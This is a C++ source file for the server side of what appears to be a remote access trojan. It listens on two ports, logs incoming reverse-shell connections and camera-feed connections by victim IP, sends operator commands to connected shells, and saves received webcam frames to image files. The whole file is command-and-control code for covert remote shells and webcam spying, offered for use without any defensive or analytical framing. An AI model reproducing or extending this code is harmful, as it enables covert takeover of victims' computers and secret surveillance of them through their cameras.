#include "Communication.h"

Communication::Communication(short revshell_port, short camera_port)
    : _revshell_port(revshell_port), _camera_port(camera_port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed");
    }
}

Communication::~Communication() {
    WSACleanup();
}

SOCKET Communication::createServerSocket(short port) {
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocket == INVALID_SOCKET) {
        throw std::runtime_error("Communication::createServerSocket() - socket");
    }

    sockaddr_in sa = { 0 };
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        throw std::runtime_error("Communication::createServerSocket() - bind");
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        throw std::runtime_error("Communication::createServerSocket() - listen");
    }

    return serverSocket;
}

void Communication::acceptClients() {
    std::thread shellThread(&Communication::acceptShell, this);
    std::thread cameraThread(&Communication::acceptCamera, this);

    shellThread.join();
    cameraThread.join();
}

void Communication::acceptShell() {
    SOCKET serverSocket = createServerSocket(_revshell_port);
    unsigned int id = 1000;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);

        _rev_shells[id] = { clientSocket , getIP(clientSocket)};

        if (clientSocket == INVALID_SOCKET) {
            throw std::runtime_error("Communication::acceptShell() - accept");
        }

        //std::thread handlerThread(&Communication::shellHandler, this, clientSocket);
        //handlerThread.detach();
        id++;
    }
}

void Communication::acceptCamera() {
    SOCKET serverSocket = createServerSocket(_camera_port);

    unsigned int id = 1000;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);

        _cameras[id] = { clientSocket , getIP(clientSocket) };

        if (clientSocket == INVALID_SOCKET) {
            throw std::runtime_error("Communication::acceptCamera() - accept");
        }

//        std::thread handlerThread(&Communication::cameraHandler, this, clientSocket);
//        handlerThread.detach();
    }
}

void Communication::cameraHandler(SOCKET cameraSocket) {
    int i = 0;
    string file_name = "0frame.png";
    string end = "";
    try {
        while (true) {

            std::ofstream outFile;
            file_name[0] = std::to_string(i)[0];
            outFile.open(file_name, std::ios::binary | std::ios::out);

            if (!outFile.is_open()) {
                throw std::runtime_error("Failed to open file");
            }

            char buffer[1024] = { 0 };
            int bytesReceived = 0;
            end = "";
            while (end != "noam") {
                bytesReceived = recv(cameraSocket, buffer, sizeof(buffer), 0);                
                end = buffer;
                end = end.substr(0, 4);
                if (end == "noam") {
                    break;
                }
                outFile.write(buffer, bytesReceived);
            }

            if (bytesReceived == SOCKET_ERROR) {
                throw std::runtime_error("Communication::cameraHandler() - recv");
            }

            outFile.close();
            i++;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        closesocket(cameraSocket);
    }
}

void Communication::shellHandler(SOCKET shellSocket) {
    string data;
    try {
        // Handle shell requests here
        while (true) {
            std::cout << ">> ";
            std::cin >> data;
            send(shellSocket, data.c_str(), data.size(), 0);
            char buffer[1024] = { 0 };
            int bytesReceived = recv(shellSocket, buffer, sizeof(buffer), 0);

            int result = (static_cast<unsigned char>(buffer[0]) << 24) |
                (static_cast<unsigned char>(buffer[1]) << 16) |
                (static_cast<unsigned char>(buffer[2]) << 8) |
                (static_cast<unsigned char>(buffer[3]));
            string res = buffer;
            res = res.substr(bytesReceived - 4, 4);

            if (bytesReceived <= 0) {
                throw std::runtime_error("Communication::shellHandler() - recv");
            }

            std::cout << "Shell data: " << res << std::endl;

            // Send response if needed
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        closesocket(shellSocket);
    }
}

string Communication::getIP(SOCKET socket) {
    sockaddr_in addr;
    int addr_len = sizeof(addr);

    // Get the peer name (address) of the connected socket
    if (getpeername(socket, (sockaddr*)&addr, &addr_len) == SOCKET_ERROR) {
        std::cerr << "getpeername failed: " << WSAGetLastError() << std::endl;
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    // Convert the IP address to a string
    inet_ntop(AF_INET, &(addr.sin_addr), ip, INET_ADDRSTRLEN);

    return std::string(ip);
}

map<unsigned int, tuple<SOCKET, string>> Communication::getRevShells(){
    return _rev_shells;
}

map<unsigned int, tuple<SOCKET, string>> Communication::getCameras(){
    return _cameras;
}